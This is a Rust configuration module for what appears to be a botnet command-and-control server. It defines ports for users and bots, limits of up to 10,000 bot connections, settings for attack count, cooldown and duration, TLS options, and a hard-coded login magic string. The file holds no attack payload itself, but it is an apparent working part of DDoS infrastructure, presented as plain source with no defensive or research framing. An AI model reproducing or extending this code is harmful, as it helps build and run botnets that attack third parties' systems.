use serde::{Deserialize, Serialize};
use std::path::Path;
use std::fs;
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Config {
    #[serde(default = "default_user_server_ip")]
    pub user_server_ip: String,
    #[serde(default = "default_bot_server_ip")]
    pub bot_server_ip: String,
    #[serde(default = "default_user_server_port")]
    pub user_server_port: u16,
    #[serde(default = "default_bot_server_port")]
    pub bot_server_port: u16,
    #[serde(default = "default_max_attacks")]
    pub max_attacks: usize,
    #[serde(default = "default_max_bot_connections")]
    pub max_bot_connections: usize,
    #[serde(default = "default_max_user_connections")]
    pub max_user_connections: usize,
    #[serde(default = "default_session_timeout")]
    pub session_timeout_secs: u64,
    #[serde(default = "default_enable_tls")]
    pub enable_tls: bool,
    #[serde(default = "default_cert_path")]
    pub cert_path: String,
    #[serde(default = "default_key_path")]
    pub key_path: String,
    #[serde(default = "default_log_level")]
    pub log_level: String,
    #[serde(default = "default_deployment_mode")]
    pub deployment_mode: String,  
    #[serde(default = "default_attack_cooldown_secs")]
    pub attack_cooldown_secs: u64,  
    #[serde(default = "default_max_attack_duration_secs")]
    pub max_attack_duration_secs: u64,
    #[serde(default = "default_handshake_timeout_secs")]
    pub handshake_timeout_secs: u64,
    #[serde(default = "default_bot_auth_timeout_secs")]
    pub bot_auth_timeout_secs: u64,
    #[serde(default = "default_strict_tls")]
    pub strict_tls: bool,
    #[serde(default = "default_rate_limit_per_minute")]
    pub rate_limit_per_minute: u32,
    #[serde(default = "default_terminal_width")]
    pub terminal_width: usize,
    #[serde(default = "default_terminal_height")]
    pub terminal_height: usize,
    #[serde(default = "default_login_magic_string")]
    pub login_magic_string: String,
}
fn default_user_server_ip() -> String { "0.0.0.0".to_string() }
fn default_bot_server_ip() -> String { "0.0.0.0".to_string() }
fn default_user_server_port() -> u16 { 1420 }
fn default_bot_server_port() -> u16 { 7002 }
fn default_max_attacks() -> usize { 3 }
fn default_max_bot_connections() -> usize { 10000 }
fn default_max_user_connections() -> usize { 100 }
fn default_session_timeout() -> u64 { 3600 }
fn default_enable_tls() -> bool { true }
fn default_cert_path() -> String { "cert.pem".to_string() }
fn default_key_path() -> String { "key.pem".to_string() }
fn default_log_level() -> String { "info".to_string() }
fn default_deployment_mode() -> String { "local".to_string() }
fn default_attack_cooldown_secs() -> u64 { 60 }  
fn default_max_attack_duration_secs() -> u64 { 300 } 
fn default_handshake_timeout_secs() -> u64 { 10 }
fn default_bot_auth_timeout_secs() -> u64 { 5 }
fn default_strict_tls() -> bool { false }
fn default_rate_limit_per_minute() -> u32 { 10 }
fn default_terminal_width() -> usize { 90 }
fn default_terminal_height() -> usize { 32 }
fn default_login_magic_string() -> String { "loginforme".to_string() }
impl Default for Config {
    fn default() -> Self {
        Self {
            user_server_ip: default_user_server_ip(),
            bot_server_ip: default_bot_server_ip(),
            user_server_port: default_user_server_port(),
            bot_server_port: default_bot_server_port(),
            max_attacks: default_max_attacks(),
            max_bot_connections: default_max_bot_connections(),
            max_user_connections: default_max_user_connections(),
            session_timeout_secs: default_session_timeout(),
            enable_tls: default_enable_tls(),
            cert_path: default_cert_path(),
            key_path: default_key_path(),
            log_level: default_log_level(),
            deployment_mode: default_deployment_mode(),
            attack_cooldown_secs: default_attack_cooldown_secs(),
            max_attack_duration_secs: default_max_attack_duration_secs(),
            handshake_timeout_secs: default_handshake_timeout_secs(),
            bot_auth_timeout_secs: default_bot_auth_timeout_secs(),
            strict_tls: default_strict_tls(),
            rate_limit_per_minute: default_rate_limit_per_minute(),
            terminal_width: default_terminal_width(),
            terminal_height: default_terminal_height(),
            login_magic_string: default_login_magic_string(),
        }
    }
}
impl Config {
    pub fn load() -> Self {
        let toml_paths = vec![
            "config/server.toml",
            "server.toml",
            "config.toml",
        ];
        for path in toml_paths {
            if Path::new(path).exists() {
                match Self::from_toml_file(path) {
                    Ok(config) => {
                        tracing::info!("Configuration loaded from {}", path);
                        tracing::info!("Terminal dimensions: {}x{}", config.terminal_width, config.terminal_height);
                        return config;
                    },
                    Err(e) => {
                        tracing::warn!("Failed to parse config file {}: {}", path, e);
                    }
                }
            }
        }
        let json_paths = vec!["config/config.json", "config.json"];
        for path in json_paths {
            if Path::new(path).exists() {
                if let Ok(config) = Self::from_json_file(path) {
                    tracing::info!("Configuration loaded from {}", path);
                    return config;
                }
            }
        }
        tracing::warn!("No config file found, using environment variables and defaults");
        let config = Self::from_env();
        if let Err(e) = config.save() {
            tracing::warn!("Failed to save default configuration: {}", e);
        } else {
            tracing::info!("Created default configuration at config/server.toml");
        }
        config
    }
    fn from_toml_file(path: &str) -> Result<Self, Box<dyn std::error::Error>> {
        let contents = fs::read_to_string(path)?;
        let value: toml::Value = toml::from_str(&contents)?;
        let server_section = value.get("server").unwrap_or(&value);
        let limits_section = value.get("limits");
        let mut config = Config::default();
        if let Some(port) = server_section.get("user_port").and_then(|v| v.as_integer()) {
            config.user_server_port = port as u16;
        }
        if let Some(port) = server_section.get("bot_port").and_then(|v| v.as_integer()) {
            config.bot_server_port = port as u16;
        }
        if let Some(tls) = server_section.get("enable_tls").and_then(|v| v.as_bool()) {
            config.enable_tls = tls;
        }
        if let Some(cert) = server_section.get("cert_path").and_then(|v| v.as_str()) {
            config.cert_path = cert.to_string();
        }
        if let Some(key) = server_section.get("key_path").and_then(|v| v.as_str()) {
            config.key_path = key.to_string();
        }
        if let Some(mode) = server_section.get("deployment_mode").and_then(|v| v.as_str()) {
            config.deployment_mode = mode.to_string();
        }
        if let Some(strict) = server_section.get("strict_tls").and_then(|v| v.as_bool()) {
            config.strict_tls = strict;
        }
        if let Some(width) = server_section.get("terminal_width").and_then(|v| v.as_integer()) {
            config.terminal_width = width as usize;
        }
        if let Some(height) = server_section.get("terminal_height").and_then(|v| v.as_integer()) {
            config.terminal_height = height as usize;
        }
        if let Some(magic) = server_section.get("login_magic_string").and_then(|v| v.as_str()) {
            config.login_magic_string = magic.to_string();
        }
        if let Some(limits) = limits_section {
            if let Some(max) = limits.get("max_bots").and_then(|v| v.as_integer()) {
                config.max_bot_connections = max as usize;
            }
            if let Some(timeout) = limits.get("session_timeout_secs").and_then(|v| v.as_integer()) {
                config.session_timeout_secs = timeout as u64;
            }
            if let Some(cooldown) = limits.get("attack_cooldown_secs").and_then(|v| v.as_integer()) {
                config.attack_cooldown_secs = cooldown as u64;
            }
            if let Some(duration) = limits.get("max_attack_duration_secs").and_then(|v| v.as_integer()) {
                config.max_attack_duration_secs = duration as u64;
            }
            if let Some(timeout) = limits.get("handshake_timeout_secs").and_then(|v| v.as_integer()) {
                config.handshake_timeout_secs = timeout as u64;
            }
            if let Some(timeout) = limits.get("bot_auth_timeout_secs").and_then(|v| v.as_integer()) {
                config.bot_auth_timeout_secs = timeout as u64;
            }
            if let Some(rate) = limits.get("rate_limit_per_minute").and_then(|v| v.as_integer()) {
                config.rate_limit_per_minute = rate as u32;
            }
        }
        Ok(config)
    }
    fn from_env() -> Self {
        use std::env;
        Self {
            user_server_ip: env::var("USER_SERVER_IP").unwrap_or_else(|_| default_user_server_ip()),
            bot_server_ip: env::var("BOT_SERVER_IP").unwrap_or_else(|_| default_bot_server_ip()),
            user_server_port: env::var("USER_SERVER_PORT")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_user_server_port),
            bot_server_port: env::var("BOT_SERVER_PORT")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_bot_server_port),
            max_attacks: env::var("MAX_ATTACKS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_max_attacks),
            max_bot_connections: env::var("MAX_BOT_CONNECTIONS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_max_bot_connections),
            max_user_connections: env::var("MAX_USER_CONNECTIONS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_max_user_connections),
            session_timeout_secs: env::var("SESSION_TIMEOUT_SECS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_session_timeout),
            enable_tls: env::var("ENABLE_TLS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_enable_tls),
            cert_path: env::var("CERT_PATH").unwrap_or_else(|_| default_cert_path()),
            key_path: env::var("KEY_PATH").unwrap_or_else(|_| default_key_path()),
            log_level: env::var("LOG_LEVEL").unwrap_or_else(|_| default_log_level()),
            deployment_mode: env::var("DEPLOYMENT_MODE").unwrap_or_else(|_| default_deployment_mode()),
            attack_cooldown_secs: env::var("ATTACK_COOLDOWN_SECS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_attack_cooldown_secs),
            max_attack_duration_secs: env::var("MAX_ATTACK_DURATION_SECS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_max_attack_duration_secs),
            handshake_timeout_secs: env::var("HANDSHAKE_TIMEOUT_SECS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_handshake_timeout_secs),
            bot_auth_timeout_secs: env::var("BOT_AUTH_TIMEOUT_SECS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_bot_auth_timeout_secs),
            strict_tls: env::var("STRICT_TLS")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_strict_tls),
            rate_limit_per_minute: env::var("RATE_LIMIT_PER_MINUTE")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_rate_limit_per_minute),
            terminal_width: env::var("TERMINAL_WIDTH")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_terminal_width),
            terminal_height: env::var("TERMINAL_HEIGHT")
                .ok()
                .and_then(|s| s.parse().ok())
                .unwrap_or_else(default_terminal_height),
            login_magic_string: env::var("LOGIN_MAGIC_STRING").unwrap_or_else(|_| default_login_magic_string()),
        }
    }
    fn from_json_file(path: &str) -> Result<Self, std::io::Error> {
        let contents = std::fs::read_to_string(path)?;
        serde_json::from_str(&contents).map_err(|e| {
            std::io::Error::new(std::io::ErrorKind::InvalidData, e)
        })
    }
    pub fn validate(&self) -> Result<(), String> {
        if self.user_server_port == 0 {
            return Err("user_server_port must be > 0".to_string());
        }
        if self.bot_server_port == 0 {
            return Err("bot_server_port must be > 0".to_string());
        }
        if self.max_attacks == 0 {
            return Err("max_attacks must be > 0".to_string());
        }
        if self.max_bot_connections == 0 {
            return Err("max_bot_connections must be > 0".to_string());
        }
        if self.max_user_connections == 0 {
            return Err("max_user_connections must be > 0".to_string());
        }
        if self.deployment_mode == "public" {
            if !self.enable_tls {
                return Err(
                    "SECURITY ERROR: TLS must be enabled for public deployment!\n".to_string() + 
                    "Either set deployment_mode=\"local\" for local network use,\n" +
                    "or set enable_tls=true and configure cert_path/key_path for public deployment."
                );
            }
            if !Path::new(&self.cert_path).exists() || !Path::new(&self.key_path).exists() {
                return Err(format!(
                    "SECURITY ERROR: TLS certificates not found at {} / {}.\n", self.cert_path, self.key_path) +
                    "In public mode, you must provide valid CA-signed certificates.\n" +
                    "Auto-generation of self-signed certificates is disabled for public deployment."
                );
            }
        }
        if !self.enable_tls {
            if self.deployment_mode == "public" {
                return Err("TLS is required for public deployment mode.".to_string());
            }
            tracing::warn!("TLS is disabled. This is not recommended for production.");
        }
        Ok(())
    }
    pub fn save(&self) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let path = "config/server.toml";
        if let Some(parent) = std::path::Path::new(path).parent() {
            std::fs::create_dir_all(parent)?;
        }
        #[derive(Serialize)]
        struct ServerConfig<'a> {
            user_port: u16,
            bot_port: u16,
            enable_tls: bool,
            cert_path: &'a str,
            key_path: &'a str,
            deployment_mode: &'a str,
            strict_tls: bool,
            terminal_width: usize,
            terminal_height: usize,
            login_magic_string: &'a str,
        }
        #[derive(Serialize)]
        struct LimitsConfig {
            max_bots: usize,
            session_timeout_secs: u64,
            attack_cooldown_secs: u64,
            max_attack_duration_secs: u64,
            handshake_timeout_secs: u64,
            bot_auth_timeout_secs: u64,
            rate_limit_per_minute: u32,
        }
        #[derive(Serialize)]
        struct TomlConfig<'a> {
            server: ServerConfig<'a>,
            limits: LimitsConfig,
        }
        let toml_config = TomlConfig {
            server: ServerConfig {
                user_port: self.user_server_port,
                bot_port: self.bot_server_port,
                enable_tls: self.enable_tls,
                cert_path: &self.cert_path,
                key_path: &self.key_path,
                deployment_mode: &self.deployment_mode,
                strict_tls: self.strict_tls,
                terminal_width: self.terminal_width,
                terminal_height: self.terminal_height,
                login_magic_string: &self.login_magic_string,
            },
            limits: LimitsConfig {
                max_bots: self.max_bot_connections,
                session_timeout_secs: self.session_timeout_secs,
                attack_cooldown_secs: self.attack_cooldown_secs,
                max_attack_duration_secs: self.max_attack_duration_secs,
                handshake_timeout_secs: self.handshake_timeout_secs,
                bot_auth_timeout_secs: self.bot_auth_timeout_secs,
                rate_limit_per_minute: self.rate_limit_per_minute,
            },
        };
        let toml_string = toml::to_string_pretty(&toml_config)?;
        std::fs::write(path, toml_string)?;
        Ok(())
    }
}
